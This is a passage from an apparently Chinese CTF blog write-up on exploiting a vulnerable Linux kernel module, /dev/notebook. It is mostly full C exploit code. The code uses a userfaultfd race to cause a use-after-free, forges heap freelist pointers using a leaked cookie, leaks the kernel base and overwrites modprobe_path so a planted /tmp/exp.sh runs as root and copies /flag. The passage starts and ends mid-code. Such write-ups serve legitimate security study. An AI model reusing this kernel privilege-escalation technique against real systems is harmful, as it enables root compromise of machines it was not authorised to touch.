class="line">write(ptmx_fds[i], tmp, <span class="number">0x10</span>);</span><br><span class="line">&#125;</span><br><span class="line">Done(<span class="string">&quot;exploit&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">uffd_register</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">ua</span>;</span><span class="comment">// io operation api</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">ur</span>;</span><span class="comment">// io register</span></span><br><span class="line">    <span class="comment">// find /usr/include -name unistd_64.h 2&gt;/dev/null</span></span><br><span class="line">    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">Dbg(<span class="string">&quot;uffd: %d&quot;</span>, uffd);</span><br><span class="line"></span><br><span class="line">ua.api = UFFD_API;</span><br><span class="line">ua.features = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(ioctl(uffd, UFFDIO_API, &amp;ua) == <span class="number">-1</span>) </span><br><span class="line">errExit(<span class="string">&quot;ioctl(uffd,UFFDIO_API,ua)&quot;</span>);</span><br><span class="line"></span><br><span class="line">ur.range.start = (<span class="type">long</span> <span class="type">long</span> <span class="type">unsigned</span> <span class="type">int</span>)fault_page;</span><br><span class="line">ur.range.len   = fault_page_len;</span><br><span class="line">ur.mode    = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == <span class="number">-1</span>)</span><br><span class="line">errExit(<span class="string">&quot;ioctl(uffd,UFFDIO_REGISTER,&amp;ur)&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">pthread_t</span> thr;</span><br><span class="line"><span class="comment">// 注意这里没有-1 pthread create正常返回0</span></span><br><span class="line"><span class="keyword">if</span>(pthread_create(&amp;thr, <span class="literal">NULL</span>, UFFD_handler ,<span class="literal">NULL</span>))</span><br><span class="line">errExit(<span class="string">&quot;pthread_create&quot;</span>);</span><br><span class="line">Done(<span class="string">&quot;regitser&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">UFFD_handler</span><span class="params">(<span class="type">void</span> *nil)</span>&#123;</span><br><span class="line">Dbg(<span class="string">&quot;UFFD handler start&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line"><span class="type">int</span> nready = <span class="number">0</span>;</span><br><span class="line">pollfd.fd= uffd;</span><br><span class="line">pollfd.events= POLLIN ;</span><br><span class="line">nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);<span class="comment">// block here</span></span><br><span class="line"><span class="keyword">if</span>(nready != <span class="number">1</span>)</span><br><span class="line">errExit(<span class="string">&quot;poll&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#123;<span class="comment">// user code modify area</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="number">0x500</span>, zero);<span class="comment">// 第一个edit free掉vuln chunk</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="number">0x400</span>, zero);<span class="comment">// 第二个edit 确保size不变</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg)) != <span class="keyword">sizeof</span>(msg))</span><br><span class="line">errExit(<span class="string">&quot;read&quot;</span>);</span><br><span class="line">assert(msg.event == UFFD_EVENT_PAGEFAULT);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">uc.src = (<span class="type">unsigned</span> <span class="type">long</span>)zero;</span><br><span class="line">uc.dst = (<span class="type">unsigned</span> <span class="type">long</span>)fault_page;</span><br><span class="line">uc.len = fault_page_len;</span><br><span class="line">uc.mode = <span class="number">0</span>;</span><br><span class="line">ioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class="line">Done(<span class="string">&quot;ioctl done&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2022/09/11/kernel-notebook-three-solutions/2.png" alt="Pasted image 20220910222000"></p><h2 id="modprobe"><a class="markdownIt-Anchor" href="#modprobe">#</a> modprobe</h2><p>篡改 modprobe 执行特权指令</p><p>write 没加锁 轻而易举配合 uffd 写 uaf</p><p>一个是注意泄漏 cookie</p><p>另外一个就是链表结尾的异或表达式 （给 name 给你写就是方便伪造这个的）</p><ul><li>通过 gift 泄漏得到结构体 <code>notebook</code>  的地址信息 由于是 c 程序进行交互，所以有了 notebook 地址信息 就能通过指针任意读取内部的其他信息了 比如 cookie</li><li>利用 setxattr 和 uffd 进行任意 uaf 劫持 篡改 notebook 通过 ko 中的 call 重定向泄漏内核基址</li><li>另外一个指针劫持到 <code>notebook</code>  的地址 这样就能继续篡改 让其指向 <code>modprobe_path</code></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;include/head.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE 1024</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">uffd_register</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">UFFD_handler</span><span class="params">(<span class="type">void</span> *nil)</span>;</span><br><span class="line"><span class="type">int</span> uffd, note_fd;</span><br><span class="line"><span class="type">uint64_t</span> mod_base_addr, cookie ,kernel_base_addr;</span><br><span class="line"><span class="type">uint64_t</span> fault_page, fault_page_len;</span><br><span class="line"><span class="type">uint64_t</span> target, modprobe_path;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> errExit(msg) do&#123;perror(msg);exit(1);&#125;while(0)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line"><span class="type">uint64_t</span> idx;</span><br><span class="line"><span class="type">uint64_t</span> size;</span><br><span class="line"><span class="type">uint64_t</span> buf;</span><br><span class="line">&#125;userarg;</span><br><span class="line"><span class="type">void</span> _add(<span class="type">size_t</span> idx, <span class="type">size_t</span> size, <span class="type">void</span> *buf)&#123;</span><br><span class="line">userarg arg;</span><br><span class="line">arg.idx = (<span class="type">uint64_t</span>)idx;</span><br><span class="line">arg.size = (<span class="type">uint64_t</span>)size;</span><br><span class="line">arg.buf = (<span class="type">uint64_t</span>)buf;</span><br><span class="line">ioctl(note_fd, <span class="number">0x100</span> ,&amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> _del(<span class="type">size_t</span> idx)&#123;</span><br><span class="line">userarg arg;</span><br><span class="line">arg.idx = (<span class="type">uint64_t</span>)idx;</span><br><span class="line">ioctl(note_fd, <span class="number">0x200</span> ,&amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> _edit(<span class="type">size_t</span> idx, <span class="type">size_t</span> newsize, <span class="type">char</span> *buf)&#123;</span><br><span class="line">userarg arg;</span><br><span class="line">arg.idx = (<span class="type">uint64_t</span>)idx;</span><br><span class="line">arg.size = (<span class="type">uint64_t</span>)newsize;</span><br><span class="line">arg.buf = (<span class="type">uint64_t</span>)buf;</span><br><span class="line">ioctl(note_fd, <span class="number">0x300</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> _gift(<span class="type">char</span> *buf)&#123;</span><br><span class="line">userarg arg;</span><br><span class="line">arg.buf = (<span class="type">uint64_t</span>)buf;</span><br><span class="line">ioctl(note_fd, <span class="number">100</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">write_to_kernel</span><span class="params">(<span class="type">size_t</span> idx, <span class="type">char</span> *user_buf)</span>&#123;</span><br><span class="line">write(note_fd, user_buf, idx);<span class="comment">// 逆向 mynote_read可以得到</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">read_from_kernel</span><span class="params">(<span class="type">size_t</span> idx, <span class="type">char</span> *user_buf)</span>&#123;</span><br><span class="line">read(note_fd, user_buf, idx);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">char</span> *buf;</span><br><span class="line"><span class="type">uint64_t</span> heap[<span class="number">2</span>];</span><br><span class="line"><span class="type">uint64_t</span> notebook_addr;</span><br><span class="line"><span class="type">char</span> zero[PAGE_SIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_DATA_SIZE 0x1000000</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">note_fd = open(<span class="string">&quot;/dev/notebook&quot;</span>, O_RDWR);</span><br><span class="line"><span class="keyword">if</span>(note_fd &lt; <span class="number">0</span>) errExit(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">buf = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">0x100</span>);<span class="comment">// name的长度</span></span><br><span class="line"></span><br><span class="line">FILE * stream = popen(<span class="string">&quot;cat /tmp/moduleaddr | awk &#x27;&#123;print $6&#125;&#x27;&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">assert(stream != <span class="literal">NULL</span>);</span><br><span class="line">fread(buf, <span class="number">0x10</span> + <span class="number">2</span>, <span class="number">1</span> ,stream);</span><br><span class="line">mod_base_addr = strtoul(buf, <span class="literal">NULL</span>, <span class="number">16</span>);</span><br><span class="line">Info(<span class="string">&quot;moduleaddr is %lx&quot;</span>, mod_base_addr);</span><br><span class="line"></span><br><span class="line">_add(<span class="number">0</span>, <span class="number">0x60</span> ,zero);<span class="comment">// 0x60 is max size</span></span><br><span class="line">_add(<span class="number">1</span>, <span class="number">0x60</span> ,zero);</span><br><span class="line"></span><br><span class="line">_gift(buf);</span><br><span class="line">Info(<span class="string">&quot;note[0] addr is 0x%lx&quot;</span>, *(<span class="type">uint64_t</span> *)buf);</span><br><span class="line">Dbg(<span class="string">&quot;buf addr is 0x%lx&quot;</span>, buf);</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> *ptr = (<span class="type">uint64_t</span> *)buf;</span><br><span class="line"><span class="comment">// 获得两个块在堆上的地址</span></span><br><span class="line">heap[<span class="number">0</span>] = ptr[<span class="number">0</span>];</span><br><span class="line">heap[<span class="number">1</span>] = ptr[<span class="number">2</span>];</span><br><span class="line">Info(<span class="string">&quot;chunk[0] addr is 0x%lx, chunk[1] is 0x%lx&quot;</span>,</span><br><span class="line">heap[<span class="number">0</span>], heap[<span class="number">1</span>]</span><br><span class="line">);</span><br><span class="line"><span class="comment">// 释放链表 0 -&gt; 1 去获取cookie</span></span><br><span class="line"></span><br><span class="line">_del(<span class="number">1</span>);</span><br><span class="line">_del(<span class="number">0</span>);</span><br><span class="line">_add(<span class="number">0</span>, <span class="number">0x60</span> ,zero);</span><br><span class="line">_add(<span class="number">1</span>, <span class="number">0x60</span> ,zero);</span><br><span class="line"><span class="comment">// pause();</span></span><br><span class="line">read_from_kernel(<span class="number">0</span>, buf);</span><br><span class="line"><span class="comment">// Info(&quot;chunk[0]&#x27;s content is 0x%lx&quot;, ptr[0]);</span></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">next = selfaddr ^ cookie ^ nextaddr</span></span><br><span class="line"><span class="comment">cookie = nextaddr ^ next ^ selfaddr</span></span><br><span class="line"><span class="comment"> */</span> </span><br><span class="line">cookie = heap[<span class="number">0</span>] ^ heap[<span class="number">1</span>] ^ ptr[<span class="number">0</span>];</span><br><span class="line">Info(<span class="string">&quot;Cookie is 0x%lx&quot;</span>, cookie); </span><br><span class="line">Dbg(<span class="string">&quot;So in this time next should be 0x%lx&quot;</span>, </span><br><span class="line">cookie ^ heap[<span class="number">0</span>] ^ heap[<span class="number">1</span>]</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 到此为止 信息收集基本完成 开始 uffd条件竞争来uaf */</span></span><br><span class="line">fault_page = (<span class="type">size_t</span>)mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">fault_page_len = <span class="number">0x1000</span>;</span><br><span class="line">uffd_register();</span><br><span class="line">write_to_kernel(<span class="number">0</span>, (<span class="type">char</span> *)fault_page);<span class="comment">// 此时卡住 让另外的线程去执行free</span></span><br><span class="line"></span><br><span class="line">Info(<span class="string">&quot;Now free_list maybe look like following:&quot;</span>);</span><br><span class="line">Info(<span class="string">&quot;&gt;&gt;  Chks-&gt;chunk[1]-&gt;chunk[0]-&gt;target  &lt;&lt;&quot;</span>);</span><br><span class="line">_del(<span class="number">1</span>);<span class="comment">// chunk[1] -&gt; chunk[0] -&gt; target</span></span><br><span class="line"><span class="comment">// 这边最好不要有任何打印操作</span></span><br><span class="line"><span class="comment">// 这里至关重要 在notebook上面伪造 cookie ^ selfaddr 作为fd 表示这链表的结束</span></span><br><span class="line">*(<span class="type">size_t</span> *)(buf + <span class="number">0xF0</span>) = cookie ^ (mod_base_addr + <span class="number">0x2500</span> - <span class="number">0x10</span>);</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="type">char</span> *buf2 = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">0x100</span>);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">0x10</span> ; i++)&#123;</span><br><span class="line">Info(<span class="string">&quot;loop %d&quot;</span>, i);</span><br><span class="line">_add(i, <span class="number">0x60</span>, zero);</span><br><span class="line">_gift(buf2);</span><br><span class="line"><span class="type">uint64_t</span> tmp = *(<span class="type">uint64_t</span> *)(buf2 + i * <span class="number">0x10</span>);</span><br><span class="line"><span class="keyword">if</span>(heap[<span class="number">0</span>] == tmp)&#123;</span><br><span class="line">Info(<span class="string">&quot;Catch it, next is target&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( i == <span class="number">0xF</span> )&#123;</span><br><span class="line">Panic(<span class="string">&quot;Failure and exit&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">Info(<span class="string">&quot;i is %d&quot;</span>, i);</span><br><span class="line"><span class="comment">// 劫持 notebook结构体</span></span><br><span class="line">_add(i + <span class="number">1</span>, <span class="number">0x60</span>, buf);</span><br><span class="line"><span class="type">uint64_t</span> PL[] = &#123;</span><br><span class="line"><span class="number">0</span>, <span class="number">0</span>, <span class="comment">// name field</span></span><br><span class="line">mod_base_addr + <span class="number">0x168</span>, <span class="number">0x4</span>,<span class="comment">// 泄漏重定位的位置</span></span><br><span class="line">mod_base_addr + <span class="number">0x2500</span>, <span class="number">0x60</span>,</span><br><span class="line">&#125;;</span><br><span class="line">write_to_kernel(i + <span class="number">1</span>, PL);</span><br><span class="line">read_from_kernel(<span class="number">0</span>, buf);</span><br><span class="line">Dbg(<span class="string">&quot;offset data is 0x%lx&quot;</span>, *(<span class="type">uint32_t</span> *)ptr);</span><br><span class="line"><span class="type">uint64_t</span> leak = mod_base_addr + <span class="number">0x168</span> + <span class="number">4</span> + *(<span class="type">uint32_t</span> *)ptr;</span><br><span class="line">Info(<span class="string">&quot;leak addr is 0x%lx&quot;</span>, <span class="number">0xffffffff00000000</span> | leak);</span><br><span class="line"><span class="comment">// kernel ffffffff81000000 0xffffffff81476c30</span></span><br><span class="line">kernel_base_addr = ( <span class="number">0xffffffff00000000</span> | leak ) - <span class="number">0x476c30</span>;</span><br><span class="line">Info(<span class="string">&quot;Kernel base addr is 0x%lx&quot;</span>, kernel_base_addr);</span><br><span class="line">modprobe_path = kernel_base_addr + <span class="number">0x125D2E0</span>;</span><br><span class="line"></span><br><span class="line">PL[<span class="number">0</span>] = modprobe_path;</span><br><span class="line">PL[<span class="number">1</span>] = <span class="number">0x10</span>;</span><br><span class="line">write_to_kernel(<span class="number">1</span>, PL);</span><br><span class="line"><span class="built_in">strcpy</span>(buf, <span class="string">&quot;/tmp/exp.sh&quot;</span>);<span class="comment">// 让modprobe执行的脚本</span></span><br><span class="line">write_to_kernel(<span class="number">0</span>, buf);</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;echo -e &#x27;#!/bin/sh\n&quot;</span></span><br><span class="line"><span class="string">&quot;/bin/cp /flag /tmp/flag\n&quot;</span></span><br><span class="line"><span class="string">&quot;/bin/chmod 777 /tmp/flag&#x27; &gt; /tmp/exp.sh\n&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;chmod +x /tmp/exp.sh&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;echo -e &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /tmp/dummy&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;chmod +x /tmp/dummy&quot;</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;/tmp/dummy&quot;</span>);</span><br><span class="line">close(note_fd);</span><br><span class="line">close(uffd);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">uffd_register</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">ua</span>;</span><span class="comment">// io operation api</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">ur</span>;</span><span class="comment">// io register</span></span><br><span class="line">    <span class="comment">// find /usr/include -name unistd_64.h 2&gt;/dev/null</span></span><br><span class="line">    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">Dbg(<span class="string">&quot;uffd: %d&quot;</span>, uffd);</span><br><span class="line"></span><br><span class="line">ua.api = UFFD_API;</span><br><span class="line">ua.features = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(ioctl(uffd, UFFDIO_API, &amp;ua) == <span class="number">-1</span>) </span><br><span class="line">errExit(<span class="string">&quot;ioctl(uffd,UFFDIO_API,ua)&quot;</span>);</span><br><span class="line"></span><br><span class="line">ur.range.start = (<span class="type">long</span> <span class="type">long</span> <span class="type">unsigned</span> <span class="type">int</span>)fault_page;</span><br><span class="line">ur.range.len   = fault_page_len;</span><br><span class="line">ur.mode    = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == <span class="number">-1</span>)</span><br><span class="line">errExit(<span class="string">&quot;ioctl(uffd,UFFDIO_REGISTER,&amp;ur)&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">pthread_t</span> thr;</span><br><span class="line"><span class="comment">// 注意这里没有-1 pthread create正常返回0</span></span><br><span class="line"><span class="keyword">if</span>(pthread_create(&amp;thr, <span class="literal">NULL</span>, UFFD_handler ,<span class="literal">NULL</span>))</span><br><span class="line">errExit(<span class="string">&quot;pthread_create&quot;</span>);</span><br><span class="line">Dbg(<span class="string">&quot;regitser done&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">UFFD_handler</span><span class="params">(<span class="type">void</span> *nil)</span>&#123;</span><br><span class="line">Dbg(<span class="string">&quot;UFFD handler start&quot;</span>);</span><br><span class="line">Dbg(<span class="string">&quot;uffd %d&quot;</span>, uffd);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line"><span class="type">int</span> nready = <span class="number">0</span>;</span><br><span class="line">pollfd.fd= uffd;</span><br><span class="line">pollfd.events= POLLIN ;</span><br><span class="line">nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);<span class="comment">// block here</span></span><br><span class="line"><span class="keyword">if</span>(nready != <span class="number">1</span>)</span><br><span class="line">errExit(<span class="string">&quot;poll&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// put some code you want</span></span><br><span class="line">_del(<span class="number">0</span>);<span class="comment">// 写没加锁 条件竞争让他free掉</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg)) != <span class="keyword">sizeof</span>(msg))</span><br><span class="line">errExit(<span class="string">&quot;read&quot;</span>);</span><br><span class="line">assert(msg.event == UFFD_EVENT_PAGEFAULT);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line"><span class="comment">// (mod_base_addr + 0x2500) 是n</span></span><br><span class="line"><span class="comment">// 由于条件竞争 接下来的数据写是写到frotebook结构体所在的位置 我们要劫持过去 篡改指针</span></span><br><span class="line">target = cookie ^ (mod_base_addr + <span class="number">0x2500</span> - <span class="number">0x10</span>) ^ heap[<span class="number">0</span>];</span><br><span class="line">Info(<span class="string">&quot;target addr is 0x%lx&quot;</span>, target);</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> s[<span class="number">2</span>] = &#123;target, <span class="number">0</span>&#125;;</span><br><span class="line">uc.src = (<span class="type">unsigned</span> <span class="type">long</span>)s;</span><br><span class="line">uc.dst = (<span 